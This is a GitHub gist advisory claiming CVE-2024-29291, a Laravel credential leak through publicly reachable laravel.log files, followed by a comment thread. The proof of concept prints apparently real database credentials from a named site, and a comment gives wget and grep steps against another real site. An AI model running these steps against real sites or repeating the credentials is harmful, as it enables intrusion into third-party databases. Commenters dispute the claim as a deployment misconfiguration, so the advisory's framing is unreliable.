
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@whiteman007](https://avatars.githubusercontent.com/u/108463448?s=64&v=4)](/whiteman007)

# [whiteman007](/whiteman007)/**[CVE-2024-29291](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784)**

Last active
June 4, 2024 14:15

Show Gist options

* [Download ZIP](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/archive/bcb4011ef4d0770fb90cdf2d38aff9af74d84a25.zip)

* [Star
  (3)
  3](/login?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/whiteman007/43bd7fa1fa0e47554b33f0cf93066784.js&quot;&gt;&lt;/script&gt;
* Save whiteman007/43bd7fa1fa0e47554b33f0cf93066784 to your computer and use it in GitHub Desktop.

[Code](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784)
[Revisions
2](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/revisions)
[Stars
3](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/stargazers)
[Forks
1](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/whiteman007/43bd7fa1fa0e47554b33f0cf93066784.js&quot;&gt;&lt;/script&gt;

Save whiteman007/43bd7fa1fa0e47554b33f0cf93066784 to your computer and use it in GitHub Desktop.

[Download ZIP](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/archive/bcb4011ef4d0770fb90cdf2d38aff9af74d84a25.zip)

 [Raw](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784/raw/bcb4011ef4d0770fb90cdf2d38aff9af74d84a25/CVE-2024-29291)

[**CVE-2024-29291**](#file-cve-2024-29291)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | CVE-ID: CVE-2024-29291 |
| --- | --- |
|  |  |
|  | Description: |
|  |  |
|  | A vulnerability has been discovered in the Laravel Framework in versions from 8.\* to 11.\*, allowing a remote attacker to obtain sensitive information via the laravel.log component. This vulnerability leads to the leakage of database credentials. |
|  |  |
|  | Additional Information: |
|  |  |
|  | None. |
|  |  |
|  | Risk: |
|  |  |
|  | High. |
|  |  |
|  | Vulnerability Type: |
|  |  |
|  | Database credential leak vulnerability. |
|  |  |
|  | Vendor of Product: |
|  |  |
|  | Laravel Framework. |
|  |  |
|  | Affected Product Code Base: |
|  |  |
|  | Laravel FRAMEWORK - 8.\* - 11.\* |
|  |  |
|  | Affected Component: |
|  |  |
|  | laravel.log. |
|  |  |
|  | Attack Type: |
|  |  |
|  | Remote. |
|  |  |
|  | Impact Information Disclosure: |
|  |  |
|  | True. |
|  |  |
|  | Attack Vectors: |
|  |  |
|  | Database credential leak vulnerability. |
|  |  |
|  | Description: |
|  |  |
|  | Access to private Database credential data is possible by logging into the website database. Additionally, login data for database access can be retrieved. |
|  |  |
|  | Proof of concept: |
|  |  |
|  | Go to any Laravel-based website and navigate to storage/logs/laravel.log. |
|  | Open the file and search for "PDO->\_\_construct('mysql:host=". |
|  | The result: |
|  | shell |
|  | Copy code |
|  | #0 /home/u429384055/domains/js-cvdocs.online/public\_html/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(70): PDO->\_\_construct('mysql:host=sql1...', 'u429384055\_jscv', 'Jaly$$a0p0p0p0', Array) |
|  | #1 /home/u429384055/domains/js-cvdocs.online/public\_html/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(46): Illuminate\Database\Connectors\Connector->createPdoConnection('mysql:host=sql1...', 'u429384055\_jscv', 'Jaly$$a0p0p0p0', Array) |
|  | Credentials: |
|  |  |
|  | Username: u429384055\_jscv |
|  | Password: Jaly$$a0p0p0p0 |
|  |  |
|  | Host: sql1... |
|  |  |
|  | Now you can login to the database. |
|  |  |
|  | By: Huseein Amer |
|  | Facebook: https://www.facebook.com/hussein.amer.75491/ |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

[![@jannescb](https://avatars.githubusercontent.com/u/17292622?s=80&v=4)](/jannescb)

Copy link

### **[jannescb](/jannescb)** commented [Apr 17, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5026635#gistcomment-5026635)

This only works in misconfigured apps, right?

`/storage` should be symlinked to `/storage/app/public` when using `php artisan storage:link`

Sorry, something went wrong.

[![@whiteman007](https://avatars.githubusercontent.com/u/108463448?s=80&v=4)](/whiteman007)

Copy link

Author

### **[whiteman007](/whiteman007)** commented [Apr 18, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5028670#gistcomment-5028670)

> This only works in misconfigured apps, right? `/storage` should be symlinked to `/storage/app/public` when using `php artisan storage:link`

The problem lies in the laravel.log file, where the system stores the login data in the log file

Sorry, something went wrong.

[![@Jelle-SamsonIT](https://avatars.githubusercontent.com/u/71821148?s=80&v=4)](/Jelle-SamsonIT)

Copy link

### **[Jelle-SamsonIT](/Jelle-SamsonIT)** commented [Apr 22, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5032561#gistcomment-5032561) • edited Loading

if you can navigate to storage/logs/laravel.log you can just as well do `cat .env`

Also, turn off debug mode please.

To anyone reading this: This does not deserve a CVE. Don't waste your time.

This is a misconception based on a deployment error.

The app should have been in prod logging mode with a loglevel higher than `debug` AND the `/public` folder should have been the root of the web path so that `storage/logs` was never accessible in the first place.

If `storage/logs` is accessible, so is `.env`, `config/` and `vendor/`

Sorry, something went wrong.

[![@whiteman007](https://avatars.githubusercontent.com/u/108463448?s=80&v=4)](/whiteman007)

Copy link

Author

### **[whiteman007](/whiteman007)** commented [Apr 25, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5035792#gistcomment-5035792)

> if you can navigate to storage/logs/laravel.log you can just as well do `cat .env` Also, turn off debug mode please.
>
> To anyone reading this: This does not deserve a CVE. Don't waste your time.
>
> This is a misconception based on a deployment error. The app should have been in prod logging mode with a loglevel higher than `debug` AND the `/public` folder should have been the root of the web path so that `storage/logs` was never accessible in the first place. If `storage/logs` is accessible, so is `.env`, `config/` and `vendor/`

mr Jelle-SamsonIT

Connection data can be displayed even if the .env file cannot be read by an attacker. It is enough just to have the ability to read the log file.

As on the site

<https://www.digo.sa/.env>

It shows you that 403

Forbidden

Cannot display data from env file

Go

<https://www.digo.sa/storage/logs/laravel.log>

Write it down

wget <https://www.digo.sa/storage/logs/laravel.log>

and

grep host laravel.log

and you can now show

'mysql:host=127....', 'africansc\_afric...', 'TYumh2rsJ0WP7Qe...'

As for the eligibility to grant CVE, mitre.org has classified it as high risk

Sorry, something went wrong.

[![@Hypernik](https://avatars.githubusercontent.com/u/31372629?s=80&v=4)](/Hypernik)

Copy link

### **[Hypernik](/Hypernik)** commented [May 7, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5048637#gistcomment-5048637)

Read this documentation <https://laravel.com/docs/11.x/filesystem#the-public-disk>

it says "The public disk included in your application's filesystems configuration file is intended for files that are going to be publicly accessible. By default, the public disk uses the local driver and stores its files in `storage/app/public`"

Thus storage/logs should not be accessible.

Sorry, something went wrong.

[![@geovaniralmeida](https://avatars.githubusercontent.com/u/30809077?s=80&v=4)](/geovaniralmeida)

Copy link

### **[geovaniralmeida](/geovaniralmeida)** commented [May 26, 2024](/whiteman007/43bd7fa1fa0e47554b33f0cf93066784?permalink_comment_id=5068840#gistcomment-5068840)

The Connector class could make use of the SensitiveParameter attribute. Seems appropriate

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fwhiteman007%2F43bd7fa1fa0e47554b33f0cf93066784)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

